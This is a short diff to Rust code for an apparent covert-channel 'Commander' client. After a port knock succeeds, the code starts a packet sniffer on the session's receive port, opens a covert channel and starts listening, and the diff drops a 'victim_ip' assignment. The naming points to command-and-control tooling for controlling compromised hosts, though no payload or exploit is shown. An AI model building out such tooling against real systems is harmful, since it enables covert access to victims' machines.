@@ -106,10 +106,17 @@ impl Commander {
             Ok(session) => {
                 println!("[+] Port knock successful.");
                 
-                // --- START THE SNIFFER HERE ---
-                println!("[DEBUG] Starting background sniffer on {}...", iface_name);
-                self.pcap_handle = Some(PcapHandle::start(&iface_name, target_ip.to_string()));
-
+                // --- UPDATED SNIFFER START ---
+                // We now pass 'session.rx_port' so the sniffer knows which stream to watch
+                println!("[DEBUG] Starting background sniffer on {} (Port {})...", iface_name, session.rx_port);
+                self.pcap_handle = Some(PcapHandle::start(
+                    &iface_name, 
+                    target_ip.to_string(), 
+                    session.rx_port // <--- Added this argument
+                ));
+                
+                // ... (Rest of connection logic: CovertChannel::new, etc.)
+                
                 let interfaces = datalink::interfaces();
                 let interface = interfaces.into_iter().find(|i| i.name == iface_name).unwrap();
                 let local_ip = interface.ips.iter()
@@ -121,9 +128,12 @@ impl Commander {
                 );
 
                 self.covert_chan = Some(chan);
-                self.victim_ip = Some(target_ip);
-                self.state = SessionState::Connected;
+                if let Some(chan_ref) = &self.covert_chan {
+                    covert::start_listening(rx, chan_ref.config.clone());
+                }
+
                 self.knock_session = Some(session);
+                self.state = SessionState::Connected;
             }
             Err(e) => println!("[!] Knock failed: {}", e),
         }
